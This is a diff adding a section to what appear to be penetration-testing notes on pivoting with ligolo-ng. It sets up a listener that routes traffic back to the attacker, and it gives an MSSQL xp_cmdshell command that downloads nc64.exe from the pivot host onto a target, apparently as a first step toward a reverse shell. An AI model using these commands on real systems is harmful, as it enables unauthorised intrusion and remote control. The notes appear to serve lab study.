@@ -131,3 +131,31 @@ To remove this redirection:
 sudo ip route delete 240.0.0.1/32 dev ligolo
 ```
 
+
+## Reverse proxy
+
+In this topology:
+
+
+| my Kali        | pivot machine  | target machine in AD |
+| -------------- | -------------- | -------------------- |
+| 192.168.10.123 | 192.168.10.200 |                      |
+|                | 10.10.10.200   | 10.10.10.14          |
+
+After setting a ligolo agent in the pivot machine and starting the tunel, we achieve to access a service in the target machine. We want to set a rev shell, but the machine does not know how to route the connection back to us. We need to set in the ligolo proxy a listener:
+
+```
+ligolo-ng » listener_add --addr 0.0.0.0:9999 --to 127.0.0.1:9999
+```
+
+Now, lets say, if we have access to this MSQL terminal we can:
+
+
+```
+# in our kali machine
+python -m http.server 9999
+
+# In the target machine
+EXEC xp_cmdshell 'powershell -c "curl.exe http://$IPpivot:9999/nc64.exe -o C:\Users\Public\nc64.exe"';
+
+```
